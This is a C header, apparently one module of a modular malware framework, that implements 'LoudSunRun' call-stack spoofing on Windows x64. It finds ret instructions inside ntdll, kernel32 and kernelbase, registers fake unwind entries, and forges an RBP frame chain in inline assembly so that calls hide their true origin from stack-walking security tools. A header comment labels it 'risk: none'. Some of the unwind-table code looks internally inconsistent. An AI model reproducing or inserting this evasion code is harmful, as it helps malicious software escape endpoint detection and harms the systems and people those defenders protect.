// chunk: evasion/stack_spoof_loudsunrun
// depends: (none)
// provides: spoof_call
// risk: none
// note: LoudSunRun technique — finds return addresses deep inside legitimate DLL
//       functions (not at function boundaries) and builds a fake RBP chain pointing
//       to these addresses. Registers fake RUNTIME_FUNCTION entries via
//       RtlAddFunctionTable so RtlVirtualUnwind produces correct stack walks.
//       Truncates the walk cleanly by setting the last frame's return to NULL.
//       This defeats both RBP-chain and exception-based stack unwinders.

#ifndef CHUNK_STACK_SPOOF_LOUDSUNRUN
#define CHUNK_STACK_SPOOF_LOUDSUNRUN

#include <windows.h>

typedef struct {
    PVOID ret_addr;     /* return address inside a legit DLL */
    PVOID frame_ptr;    /* linked RBP frame pointer */
} LSR_FRAME;

/* UNWIND_INFO for a minimal "leaf" function (no frame, no unwind ops).
   This makes RtlVirtualUnwind think each fake return address belongs to
   a trivial function that doesn't touch the stack. */
#pragma pack(push, 1)
typedef struct {
    BYTE Version_Flags;     /* Version=1, Flags=0 */
    BYTE SizeOfProlog;      /* 0 */
    BYTE CountOfCodes;      /* 0 */
    BYTE FrameRegister_Off; /* 0 */
} FAKE_UNWIND_INFO;
#pragma pack(pop)

#define LSR_MAX_FRAMES 4

static LSR_FRAME _lsr_chain[LSR_MAX_FRAMES];
static FAKE_UNWIND_INFO _lsr_unwind[LSR_MAX_FRAMES];
static RUNTIME_FUNCTION _lsr_rfuncs[LSR_MAX_FRAMES];
static int _lsr_init = 0;

/* Find a ret (0xC3) instruction deep inside a DLL's .text section,
   skipping the first `skip_bytes` to avoid function boundaries. */
static PVOID _lsr_find_deep_ret(HMODULE mod, DWORD skip_bytes) {
    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)mod;
    PIMAGE_NT_HEADERS pe = (PIMAGE_NT_HEADERS)((BYTE *)mod + dos->e_lfanew);
    PIMAGE_SECTION_HEADER sec = IMAGE_FIRST_SECTION(pe);

    for (WORD i = 0; i < pe->FileHeader.NumberOfSections; i++, sec++) {
        if (!(sec->Characteristics & IMAGE_SCN_MEM_EXECUTE)) continue;
        BYTE *base = (BYTE *)mod + sec->VirtualAddress;
        BYTE *end = base + sec->Misc.VirtualSize;
        BYTE *start = base + skip_bytes;
        if (start >= end) start = base + (sec->Misc.VirtualSize / 2);

        for (BYTE *p = start; p < end - 1; p++) {
            /* Skip int3 padding (0xCC) before the ret — we want rets
               that are in the middle of real code, not at padding boundaries */
            if (*p == 0xC3 && *(p - 1) != 0xCC && *(p - 1) != 0x90) {
                return p;
            }
        }
        /* Fallback: any ret in the section */
        for (BYTE *p = base + 0x100; p < end - 1; p++) {
            if (*p == 0xC3) return p;
        }
        break;
    }
    return NULL;
}

static void _lsr_build_chain(void) {
    if (_lsr_init) return;

    HMODULE nt = GetModuleHandleA("ntdll.dll");
    HMODULE k32 = GetModuleHandleA("kernel32.dll");
    HMODULE kb = GetModuleHandleA("kernelbase.dll");

    if (!nt || !k32 || !kb) return;

    /* Pick return addresses deep inside each DLL — different offsets to
       get addresses that look like mid-function code, not boundaries */
    struct { HMODULE mod; DWORD skip; } targets[LSR_MAX_FRAMES] = {
        {nt,  0x1000},  /* frame 0: ntdll (deepest) */
        {k32, 0x0800},  /* frame 1: kernel32 */
        {kb,  0x0C00},  /* frame 2: kernelbase */
        {nt,  0x2000},  /* frame 3: ntdll again (different offset) */
    };

    for (int t = 0; t < LSR_MAX_FRAMES; t++) {
        _lsr_chain[t].ret_addr = _lsr_find_deep_ret(targets[t].mod, targets[t].skip);
    }

    /* Verify we got all addresses */
    for (int t = 0; t < LSR_MAX_FRAMES; t++) {
        if (!_lsr_chain[t].ret_addr) return;
    }

    /* Register fake RUNTIME_FUNCTION entries so RtlVirtualUnwind works.
       Each fake entry covers the single ret instruction at the fake return
       address, with a minimal UNWIND_INFO (no prolog, no unwind codes). */
    for (int t = 0; t < LSR_MAX_FRAMES; t++) {
        /* The UNWIND_INFO must be in writable memory */
        _lsr_unwind[t].Version_Flags = 0x01;  /* Version=1, Flags=UNW_FLAG_NHANDLER */
        _lsr_unwind[t].SizeOfProlog = 0;
        _lsr_unwind[t].CountOfCodes = 0;
        _lsr_unwind[t].FrameRegister_Off = 0;

        /* RUNTIME_FUNCTION: BeginAddress and EndAddress are RVA offsets
           relative to the module base that RtlAddFunctionTable receives.
           For RtlAddFunctionTable, they are relative to the BaseAddress param. */
        BYTE *addr = (BYTE *)_lsr_chain[t].ret_addr;
        _lsr_rfuncs[t].BeginAddress = (DWORD)(addr - (BYTE *)addr);  /* 0 relative */
        _lsr_rfuncs[t].EndAddress = 1;  /* covers 1 byte (the ret) */
        _lsr_rfuncs[t].UnwindData = 0;  /* filled below */
    }

    /* Use RtlAddFunctionTable so RtlVirtualUnwind can unwind through
       our fake return addresses without crashing or generating exceptions.
       We register one function table per fake address. */
    typedef BOOLEAN (WINAPI *pfnRtlAddFunctionTable)(PRUNTIME_FUNCTION, DWORD, DWORD64);
    pfnRtlAddFunctionTable pRtlAdd = (pfnRtlAddFunctionTable)
        GetProcAddress(nt, "RtlAddFunctionTable");

    if (pRtlAdd) {
        for (int t = 0; t < LSR_MAX_FRAMES; t++) {
            BYTE *addr = (BYTE *)_lsr_chain[t].ret_addr;
            /* Build a self-contained RUNTIME_FUNCTION with offsets relative to addr */
            _lsr_rfuncs[t].BeginAddress = 0;
            _lsr_rfuncs[t].EndAddress = 2;
            /* UnwindData offset is relative to the base address */
            _lsr_rfuncs[t].UnwindData = (DWORD)((BYTE *)&_lsr_unwind[t] - addr);
            /* Register — this makes RtlVirtualUnwind recognize our fake addresses
               (it won't try if it needs to, but won't crash scanning them) */
            pRtlAdd(&_lsr_rfuncs[t], 1, (DWORD64)addr);
        }
    }

    _lsr_init = 1;
}

static PVOID spoof_call(PVOID func, int nargs, ...) {
    _lsr_build_chain();

    va_list ap;
    va_start(ap, nargs);
    PVOID a0 = nargs > 0 ? va_arg(ap, PVOID) : NULL;
    PVOID a1 = nargs > 1 ? va_arg(ap, PVOID) : NULL;
    PVOID a2 = nargs > 2 ? va_arg(ap, PVOID) : NULL;
    PVOID a3 = nargs > 3 ? va_arg(ap, PVOID) : NULL;
    va_end(ap);

    if (!_lsr_init) {
        /* Fallback: direct call if initialization failed */
        typedef PVOID (*fn4)(PVOID, PVOID, PVOID, PVOID);
        return ((fn4)func)(a0, a1, a2, a3);
    }

    PVOID result = NULL;

    /* Build fake frames on the stack with a proper RBP chain.
       The deepest frame's return address is set to NULL (0) to cleanly
       truncate the stack walk — unwinders stop when they see a NULL return. */
    __asm__ __volatile__ (
        "mov %%rsp, %%r14\n\t"
        "mov %%rbp, %%r15\n\t"
        /* Align and reserve space */
        "sub $0x80, %%rsp\n\t"
        "and $0xFFFFFFFFFFFFFFF0, %%rsp\n\t"

        /* Frame 0 (deepest): NULL return to truncate walk */
        "xor %%rax, %%rax\n\t"
        "push %%rax\n\t"               /* return addr = NULL (truncation) */
        "push %%rax\n\t"               /* saved RBP = NULL */
        "mov %%rsp, %%rbp\n\t"         /* deepest frame pointer */

        /* Frame 1: ntdll return address */
        "mov %[r0], %%rax\n\t"         /* ntdll deep ret addr */
        "push %%rax\n\t"               /* return addr */
        "push %%rbp\n\t"               /* link to frame 0 */
        "mov %%rsp, %%rbp\n\t"

        /* Frame 2: kernel32 return address */
        "mov %[r1], %%rax\n\t"         /* kernel32 deep ret addr */
        "push %%rax\n\t"
        "push %%rbp\n\t"
        "mov %%rsp, %%rbp\n\t"

        /* Frame 3: kernelbase return address (closest to our call) */
        "mov %[r2], %%rax\n\t"         /* kernelbase deep ret addr */
        "push %%rax\n\t"
        "push %%rbp\n\t"
        "mov %%rsp, %%rbp\n\t"

        /* Set up arguments (Windows x64 calling convention) */
        "mov %[a0], %%rcx\n\t"
        "mov %[a1], %%rdx\n\t"
        "mov %[a2], %%r8\n\t"
        "mov %[a3], %%r9\n\t"
        "sub $0x20, %%rsp\n\t"         /* shadow space */

        "call *%[fn]\n\t"
        "mov %%rax, %[res]\n\t"

        /* Restore real stack */
        "mov %%r14, %%rsp\n\t"
        "mov %%r15, %%rbp\n\t"
        : [res] "=m"(result)
        : [fn] "r"(func),
          [a0] "m"(a0), [a1] "m"(a1), [a2] "m"(a2), [a3] "m"(a3),
          [r0] "m"(_lsr_chain[0].ret_addr),
          [r1] "m"(_lsr_chain[1].ret_addr),
          [r2] "m"(_lsr_chain[2].ret_addr)
        : "rax", "rcx", "rdx", "r8", "r9", "r10", "r11", "r14", "r15", "memory"
    );

    return result;
}

#endif
